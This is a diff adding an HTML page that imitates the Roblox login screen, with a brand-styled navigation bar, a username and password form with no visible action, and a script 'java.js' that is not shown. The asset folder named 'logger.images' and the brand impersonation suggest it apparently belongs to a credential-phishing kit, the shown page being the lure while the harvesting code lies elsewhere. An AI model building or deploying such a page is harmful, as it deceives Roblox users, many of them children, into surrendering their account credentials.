@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="java.js" defer></script>
+    <link rel="icon" href="logger.images/Roblox_Logo_2025.png" type="image/png">
+</head>
+<body>
+    <div class="container">
+        <!-- Navigation Bar -->
+        <nav class="navbar">
+            <div class="nav-left">
+                <div class="logo">
+                    <div class="logo-square">
+                        <div class="logo-dot"></div>
+                    </div>
+                </div>
+                <div class="nav-links">
+                    <a href="#" class="nav-link">Charts</a>
+                    <a href="#" class="nav-link">Marketplace</a>
+                    <a href="#" class="nav-link">Create</a>
+                    <a href="#" class="nav-link">Robux</a>
+                </div>
+            </div>
+            <div class="nav-right">
+                <div class="search-container">
+                    <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none">
+                        <path d="M21 21L16.514 16.506L21 21ZM19 10.5C19 15.194 15.194 19 10.5 19C5.806 19 2 15.194 2 10.5C2 5.806 5.806 2 10.5 2C15.194 2 19 5.806 19 10.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <input type="text" placeholder="Search" class="search-input">
+                </div>
+                <button class="signup-btn">Sign Up</button>
+            </div>
+        </nav>
+
+        <!-- Login Form -->
+        <div class="login-container">
+            <div class="login-card">
+                <h1 class="login-title">Login to Roblox</h1>
+
+                <form id="loginForm" class="login-form">
+                    <input type="text" id="username" placeholder="Username/Email/Phone" class="form-input" required>
+                    <input type="password" id="password" placeholder="Password" class="form-input" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+
+                <a href="#" class="forgot-link">Forgot Password or Username?</a>
+
+                <div class="alternative-options">
+                    <button class="alt-btn">Email Me a One-Time Code</button>
+                    <button class="alt-btn">Use Another Device</button>
+                </div>
+
+                <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
